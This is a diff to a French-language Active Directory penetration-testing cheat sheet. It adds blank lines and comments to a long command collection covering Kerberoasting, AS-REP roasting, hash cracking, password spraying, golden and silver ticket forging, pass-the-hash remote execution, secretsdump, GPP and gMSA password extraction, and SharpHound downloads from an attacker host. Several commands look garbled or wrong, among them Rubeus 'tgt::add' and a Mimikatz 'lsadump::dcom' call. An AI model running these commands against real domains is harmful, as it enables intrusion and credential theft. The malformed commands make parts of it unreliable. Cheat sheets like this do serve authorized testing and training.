@@ -17,6 +17,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum <target-ip>
+
 ```
 
 
@@ -24,6 +25,7 @@ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 
 
 ```bash
 ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
+
 ```
 
 
@@ -31,6 +33,7 @@ ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
 
 ```bash
 gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
+
 ```
 
 
@@ -38,6 +41,7 @@ gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/su
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
+
 ```
 
 
@@ -49,6 +53,7 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
 
 # Utilisation de CrackMapExec
 crackmapexec smb [domain].com -u '' -p '' --users
+
 ```
 
 
@@ -60,6 +65,7 @@ impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>
 
 # Utilisation de Enum4Linux
 enum4linux -a -u "<username>" -p "<password>" <dc_ip>
+
 ```
 
 
@@ -72,11 +78,14 @@ Interroger les enregistrements DNS et identifier les services associés.
 
 ```bash
 nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
+
 ```
 
 
 ```bash
+# Exécuter les scripts NSE sélectionnés
 nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
+
 ```
 
 
@@ -84,29 +93,36 @@ nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
 
 ```bash
 dig axfr @<dc-ip> <domain>
+
 ```
 
 
 ```bash
+# Interroger les enregistrements DNS
 dig A <domain> @<dc-ip>
 dig SRV _ldap._tcp.dc._msdcs.<domain> @<dc-ip>
+
 ```
 
 
 ```bash
+# Interroger les enregistrements DNS
 dig axfr <domain_name> @<dns_server_ip>  # Attempt zone transfer
 dig ANY <domain_name> @<dns_server_ip>  # Retrieve all records
 nslookup
 > server <dns_server_ip>
 > set type=any
 > <domain_name>  # Query any records
+
 ```
 
 
 ```bash
+# Énumérer les enregistrements DNS
 dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr
 
 dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
+
 ```
 
 
@@ -114,6 +130,7 @@ dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain
 
 ```bash
 nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
+
 ```
 
 
@@ -121,6 +138,7 @@ nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a
 
 ```bash
 dig @<dns_server_ip> -t A +norecurse <target_domain>
+
 ```
 
 
@@ -128,6 +146,7 @@ dig @<dns_server_ip> -t A +norecurse <target_domain>
 
 ```powershell
 Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
+
 ```
 
 
@@ -147,6 +166,7 @@ nmap -p 88 --script kerberos-brute <target_ip>
 
 # Énumérer les NSP (Noms principaux des services)
 nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
+
 ```
 
 
@@ -160,6 +180,7 @@ GetNPUsers.py <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_co
 
 # Crack the found hashes
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -170,6 +191,7 @@ GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>
 
 # Crack the resulting hash
 hashcat -m 13100 kerberoast.txt rockyou.txt
+
 ```
 
 
@@ -179,6 +201,7 @@ hashcat -m 13100 kerberoast.txt rockyou.txt
 kerbrute userenum -d <domain> -p <userlist> <target_ip>
 # Autre possibilité
 ./kerbrute_linux_amd64 userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
 ```
 
 
@@ -186,6 +209,7 @@ kerbrute userenum -d <domain> -p <userlist> <target_ip>
 
 ```bash
 impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
+
 ```
 
 
@@ -193,6 +217,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain
 
 ```bash
 impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
+
 ```
 
 
@@ -202,6 +227,7 @@ impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
 john --wordlist=<wordlist> <ticket_file>
 # or
 hashcat -m 13100 <ticket_file> <wordlist>
+
 ```
 
 
@@ -213,6 +239,7 @@ python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>
 
 # Request a Service Ticket (TGS)
 python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
+
 ```
 
 
@@ -226,13 +253,16 @@ impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<usernam
 john --wordlist=<wordlist> <tickets_file>
 # or
 hashcat -m 13100 <tickets_file> <wordlist>
+
 ```
 
 
 
 
 ```bash
+# Vérifier les identifiants Kerberos
 krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
+
 ```
 
 
@@ -246,6 +276,7 @@ python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <
 rubeus.exe asktgt /user:<username> /rc4:<password>
 rubeus.exe tgtdeleg /user:<username> /rc4:<password>
 rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
+
 ```
 
 
@@ -254,6 +285,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 ```powershell
 # Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
 mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
+
 ```
 
 
@@ -262,6 +294,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```bash
 # Essai de configurations de pré-authentification faibles
 python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
+
 ```
 
 
@@ -270,6 +303,7 @@ python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 ```bash
 # Créer un ticket argent avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
+
 ```
 
 
@@ -281,6 +315,7 @@ impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>
 
 # 2. Forge a Silver Ticket
 impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
+
 ```
 
 
@@ -289,6 +324,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 ```bash
 # Créer un billet doré avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
+
 ```
 
 
@@ -306,6 +342,7 @@ impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
 # (Optional) Pass the Golden Ticket
 impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
+
 ```
 
 
@@ -318,6 +355,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" <target_ip>
+
 ```
 
 
@@ -327,6 +365,7 @@ nmap -n -sV --script "ldap* and not brute" <target_ip>
 ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=*)"
 # Autre possibilité
 ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
+
 ```
 
 
@@ -336,6 +375,7 @@ ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountNa
 
 # Énumérer les groupes du domaine
 ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn
+
 ```
 
 
@@ -370,6 +410,7 @@ ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=
 
 # Specifies the value term to return
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
+
 ```
 
 
@@ -377,6 +418,7 @@ ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=
 
 ```bash
 kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
+
 ```
 
 
@@ -477,6 +519,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 
 # Rechercher tous les comptes avec des attributs spécifiques
 (pwdLastSet=0)
+
 ```
 
 
@@ -497,6 +540,7 @@ sudo nbtscan -r 192.168.50.0/24
 
 # Vue réseau Windows
 net view \\[domainName] /all
+
 ```
 
 
@@ -514,6 +558,7 @@ nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args 
 nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>
 
 nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>
+
 ```
 
 
@@ -525,6 +570,7 @@ smbclient -L //<dc-ip> -U "guest"
 
 # Lister les actions en utilisant CrackMapExec (CME).
 crackmapexec smb <dc-ip> -u '' -p '' --shares
+
 ```
 
 
@@ -534,6 +580,7 @@ rpcclient -U "" <dc-ip> --command="enumdomusers"
 
 # Or use CME for RID cycling.
 crackmapexec smb <dc-ip> --rid-brute
+
 ```
 
 
@@ -545,6 +592,7 @@ sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 
 # Listes des actions SMB disponibles sur la cible
 smbclient -L <IP>
+
 ```
 
 
@@ -559,6 +607,7 @@ smbmap -H <IP>
 smbmap -u '' -p '' -H <IP>
 smbmap -u 'guest' -p '' -H <IP>
 smbmap -u '' -p '' -H <IP> -R
+
 ```
 
 
@@ -571,6 +620,7 @@ crackmapexec smb <IP> -u 'guest' -p ''
 crackmapexec smb <IP> -u '' -p '' --shares
 crackmapexec smb <IP> -u guest -p "" --rid-brute
 crackmapexec smb <IP> -u '[user]' -p '[password]'
+
 ```
 
 
@@ -591,10 +641,12 @@ enum4linux -a -M -l -d <ip> 2>&1
 enum4linux -a -u "" -p "" <ip>
 enum4linux -a -u "guest" -p "" <ip>
 enum4linux -a -u "[user]" -p "[password]" <ip>
+
 ```
 
 
 ```bash
+# Lister les partages SMB du serveur
 smbclient --no-pass -L //<ip>
 smbclient -L //<ip> -U [user]
 smbclient //<IP>/<SHARE>
@@ -610,6 +662,7 @@ timeout 100
 prompt off
 recurse on
 mget *
+
 ```
 
 
@@ -618,6 +671,7 @@ mget *
 ```bash
 crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
+
 ```
 
 
@@ -628,6 +682,7 @@ hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 mkdir /tmp/share
 sudo mount -t cifs //<IP>/<SHARE> /tmp/share
 sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
+
 ```
 
 
@@ -649,6 +704,7 @@ smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # AteExec
 atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
 atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
 ```
 
 
@@ -662,6 +718,7 @@ psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # Vérification avec CrackMapExec
 crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
 crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
+
 ```
 
 
@@ -677,6 +734,7 @@ wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # Vérification avec CrackMapExec
 crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
 crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
+
 ```
 
 
@@ -689,6 +747,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -p 5985,5986 --script winrm-info $IP
+
 ```
 
 
@@ -696,6 +755,7 @@ nmap -p 5985,5986 --script winrm-info $IP
 
 ```bash
 crackmapexec winrm <dc-ip> -u <username> -p <password>
+
 ```
 
 
@@ -703,6 +763,7 @@ crackmapexec winrm <dc-ip> -u <username> -p <password>
 
 ```bash
 evil-winrm -i <dc-ip> -u <username> -p <password>
+
 ```
 
 
@@ -710,6 +771,7 @@ evil-winrm -i <dc-ip> -u <username> -p <password>
 
 ```bash
 crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
+
 ```
 
 
@@ -718,6 +780,7 @@ crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 ```powershell
 # Utilisation de PowerShell pour se connecter à WinRM
 Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
+
 ```
 
 
@@ -737,6 +800,7 @@ whoami /user
 
 # Utilisation de vmic
 wmic useraccount where name='[usernameToFind]' get sid
+
 ```
 
 
@@ -757,6 +821,7 @@ nslookup yourdomain.com
 
 # Utilisation de ADUC
 # Ouvrir ADUC --> Dans l'unité organisationnelle des contrôleurs de domaine (OU), vous pouvez trouver les contrôleurs de domaine répertoriés là.
+
 ```
 
 
@@ -780,6 +845,7 @@ Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames
 
 # Utilisation de ADUC
 Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
+
 ```
 
 
@@ -790,6 +856,7 @@ Open Active Directory Users and Computers and enable Advanced Features under the
   # Bash (Kali)
   ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
   
+
 ```
 
 
@@ -798,12 +865,14 @@ Open Active Directory Users and Computers and enable Advanced Features under the
 ```bash
 net user /domain
 net user [username] /domain
+
 ```
 
 
 ```bash
 net groups /domain
 net groups [groupName] /domain
+
 ```
 
 
@@ -813,6 +882,7 @@ net groups [groupName] /domain
 $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
 $DN = ([adsi]'').distinguishedName 
 $LDAP = "LDAP://$PDC/$DN"
+
 ```
 
 
@@ -830,6 +900,7 @@ function Get-SAMInfo {
       $_.Properties
   }
 }
+
 ```
 
 
@@ -837,6 +908,7 @@ function Get-SAMInfo {
 
 ```powershell
 $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"
+
 ```
 
 
@@ -851,6 +923,7 @@ function LDAPSearch {
   $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
   return $DirectorySearcher.FindAll()
 }
+
 ```
 
 
@@ -858,11 +931,14 @@ function LDAPSearch {
 
 ```powershell
 LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+
 ```
 
 
 ```powershell
+# Interroger l'annuaire LDAP
 LDAPSearch -LDAPQuery "(objectclass=group)"
+
 ```
 
 
@@ -870,6 +946,7 @@ LDAPSearch -LDAPQuery "(objectclass=group)"
 
 ```text
 $group
+
 ```
 
 
@@ -879,6 +956,7 @@ $group
 foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
   $group.Properties | Select-Object {$_.cn}, {$_.member}
 }
+
 ```
 
 
@@ -889,6 +967,7 @@ foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
 
 ```powershell
 Import-Module .\PowerView.ps1
+
 ```
 
 
@@ -900,6 +979,7 @@ Import-Module .\PowerView.ps1
 
 ```powershell
 Get-ADDomainController -Discover
+
 ```
 
 
@@ -910,27 +990,36 @@ Get-ADDomainController -Discover
 
 
 ```powershell
+# Énumérer les utilisateurs du domaine
 Get-NetUser | Select-Object [attributes]
+
 ```
 
 
 ```powershell
+# Énumérer les groupes du domaine
 Get-NetGroup | Select-Object [attributes]
+
 ```
 
 
 ```powershell
 Get-NetComputer | Select-Object [attributes]
+
 ```
 
 
 ```powershell
+# Énumérer les groupes du domaine
 Get-NetGroup -GroupName "Domain Admins"
+
 ```
 
 
 ```powershell
+# Énumérer les utilisateurs du domaine
 Get-NetUser -SPN
+
 ```
 
 
@@ -941,7 +1030,9 @@ Get-NetUser -SPN
 
 
 ```powershell
+# Énumérer les utilisateurs du domaine
 Get-NetUser -Delegation
+
 ```
 
 
@@ -954,6 +1045,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 setspn -L [service]
+
 ```
 
 
@@ -961,6 +1053,7 @@ setspn -L [service]
 
 ```powershell
 Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+
 ```
 
 
@@ -975,7 +1068,9 @@ Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
 
 
 ```powershell
+# Examiner les permissions d'un objet Active Directory
 Get-ObjectAcl -Identity [username]
+
 ```
 
 
@@ -983,13 +1078,16 @@ Get-ObjectAcl -Identity [username]
 
 ```powershell
 Convert-SidToName [SID]
+
 ```
 
 
 
 
 ```powershell
+# Examiner les permissions d'un objet Active Directory
 Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights
+
 ```
 
 
@@ -997,6 +1095,7 @@ Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights 
 
 ```powershell
 "[SID1]", "[SID2]" | Convert-SidToName
+
 ```
 
 
@@ -1004,6 +1103,7 @@ Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights 
 
 ```bash
 net group "[GroupName]" [username] /add /domain
+
 ```
 
 
@@ -1011,6 +1111,7 @@ net group "[GroupName]" [username] /add /domain
 
 ```powershell
 Get-NetGroup "[GroupName]" | Select-Object member
+
 ```
 
 
@@ -1027,6 +1128,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 gpp-decrypt [encrypted_password]
+
 ```
 
 
@@ -1043,6 +1145,7 @@ Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.ps1" -OutFile "C:\Temp\s
 
 # Vous pouvez également télécharger la version .exe
 Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\sharphound.exe"
+
 ```
 
 
@@ -1058,6 +1161,7 @@ Get-ADDomainController -Discover
 .\SharpHound.exe -c All
 # Autre possibilité
 .\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
+
 ```
 
 
@@ -1069,6 +1173,7 @@ Import-Module .\SharpHound.ps1
 
 # Recueillir toutes les données du domaine
 Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Temp
+
 ```
 
 
@@ -1081,6 +1186,7 @@ Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Tem
 ```powershell
 Invoke-BloodHound -CollectionMethod Group
 Invoke-BloodHound -CollectionMethod ACL
+
 ```
 
 
@@ -1102,6 +1208,7 @@ scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir
 
 # Télécharger via un serveur web
 Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip"
+
 ```
 
 
@@ -1114,6 +1221,7 @@ Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip
 ```bash
 # Démarrer le service Neo4j à Kali (nécessaire pour analyser les données collectées):
 sudo neo4j start
+
 ```
 
 
@@ -1125,6 +1233,7 @@ sudo neo4j start
 
 ```text
 GPO control
+
 ```
 
 
@@ -1132,6 +1241,7 @@ GPO control
 
 ```text
 (NODES)-[:RELATIONSHIP]->(NODES)
+
 ```
 
 
@@ -1139,16 +1249,19 @@ GPO control
 
 ```text
 MATCH (m:Computer) RETURN m
+
 ```
 
 
 ```text
 MATCH (m:User) RETURN m
+
 ```
 
 
 ```text
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+
 ```
 
 
@@ -1160,6 +1273,7 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 
 ```text
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+
 ```
 
 
@@ -1171,6 +1285,7 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:S
 
 ```text
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
 ```
 
 
@@ -1183,6 +1298,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 secretsdump.py <domain>/<username>:<password>@<dc-ip>
+
 ```
 
 
@@ -1190,6 +1306,7 @@ secretsdump.py <domain>/<username>:<password>@<dc-ip>
 
 ```bash
 hashcat -m 1000 ntlm-hashes.txt rockyou.txt
+
 ```
 
 
@@ -1198,6 +1315,7 @@ hashcat -m 1000 ntlm-hashes.txt rockyou.txt
 ```bash
 # De nombreuses autres commandes se trouvent dans la Section 6.
 crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
+
 ```
 
 
@@ -1208,6 +1326,7 @@ crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
 
 ```bash
 rpcclient -U "<user>%<password>" <dc-ip> --command="enumprinters"
+
 ```
 
 
@@ -1361,6 +1480,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```powershell
 net use z:\\[hostname/domain]\SYSVOL
+
 ```
 
 
@@ -1372,6 +1492,7 @@ net use z:\\[hostname/domain]\SYSVOL
 
 ```text
 \hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml
+
 ```
 
 
@@ -1381,6 +1502,7 @@ net use z:\\[hostname/domain]\SYSVOL
 dir /s Groups.xml
 
 type Groups.xml
+
 ```
 
 
@@ -1396,6 +1518,7 @@ gpp-decrypt [gpp_hash/cpassword]
 # Exemple
 gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
 sup3r53cr3tGP0pa55
+
 ```
 
 
@@ -1407,6 +1530,7 @@ dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
 
 # Recherchez les fichiers Groups.xml qui peuvent contenir des mots de passe clairs.
 smbclient //dc-ip/SYSVOL -U "domain\username"
+
 ```
 
 
@@ -1422,22 +1546,30 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 ```bash
+# Examiner les préférences de groupe GPP
 Get-GPPPassword.py -no-pass '[DOMAIN_CONTROLLER]'
+
 ```
 
 
 ```bash
+# Examiner les préférences de groupe GPP
 Get-GPPPassword.py '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
+
 ```
 
 
 ```bash
+# Examiner les préférences de groupe GPP
 Get-GPPPassword.py -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
+
 ```
 
 
 ```bash
+# Examiner les préférences de groupe GPP
 Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
+
 ```
 
 
@@ -1451,6 +1583,7 @@ Examiner les objets, les droits et les services du domaine.
 ```bash
 # Référence à un script pour télécharger des fichiers dans SYSVOL
 https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
+
 ```
 
 
@@ -1462,6 +1595,7 @@ https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords
 
 ```bash
 grep -inr "cpassword"
+
 ```
 
 
@@ -1472,11 +1606,14 @@ grep -inr "cpassword"
 
 ```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+
 ```
 
 
 ```bash
+# Utiliser le module gpp_password
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
+
 ```
 
 
@@ -1498,6 +1635,7 @@ Import-Module .\adPEAS.ps1
 gc -raw .\adPEAS.ps1 | iex
 
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
+
 ```
 
 
@@ -1511,12 +1649,16 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Domain '[domain].com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'
+
 ```
 
 
@@ -1526,13 +1668,16 @@ Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'
 $SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('[domain]\[userName]', $SecPassword)
 Invoke-adPEAS -Domain '[domain].com' -Cred $Cred
+
 ```
 
 
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[domain]\[userName]' -Password '[password]' -Force
+
 ```
 
 
@@ -1543,51 +1688,70 @@ Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[doma
 
 ```powershell
 Invoke-adPEAS -Module Domain
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Rights
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module GPO
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module ADCS
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Creds
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Delegation
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Accounts
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Computer
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Bloodhound
+
 ```
 
 
 ```powershell
+# Recenser les objets Active Directory avec adPEAS
 Invoke-adPEAS -Module Bloodhound -Scope All
+
 ```
 
 
@@ -1602,6 +1766,7 @@ Invoke-adPEAS -Module Bloodhound -Scope All
 
 ```powershell
 Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *
+
 ```
 
 
@@ -1612,7 +1777,9 @@ Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 
 
 ```powershell
+# Rechercher un objet Active Directory
 Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties *
+
 ```
 
 
@@ -1632,7 +1799,9 @@ Examiner les objets, les droits et les services du domaine.
 
 
 ```powershell
+# Collecter les relations Active Directory
 SharpHound.exe -c All
+
 ```
 
 
@@ -1644,6 +1813,7 @@ SharpHound.exe -c All
 
 ```text
 Find Principals with Unusual Rights on Password Attributes
+
 ```
 
 
@@ -1671,6 +1841,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 # Exemple
 .\GMSAPasswordReader.exe --accountname 'svc_apache'
 # Le résultat peut contenir une clé rc4_hmac liée au hash NT du compte. Préserver les paramètres exacts : hashcat -m 1000 '[ntlm_hash]' [wordlist] ; le compte de service peut être nommé svc_apache$ (exemple source : evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
+
 ```
 
 
@@ -1693,6 +1864,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```powershell
 # Trouver tous les comptes gMSA
 Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties msDS-ManagedPassword
+
 ```
 
 
@@ -1703,7 +1875,9 @@ Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 
 
 ```powershell
+# Rechercher un objet Active Directory
 Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Properties msDS-ManagedPassword
+
 ```
 
 
@@ -1715,6 +1889,7 @@ Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Proper
 
 ```bash
 ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword
+
 ```
 
 
@@ -1727,6 +1902,7 @@ ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>"
 ```powershell
 # Liste des comptes gMSA avec PowerView
 Get-DomainGMSA -Properties msDS-ManagedPassword
+
 ```
 
 
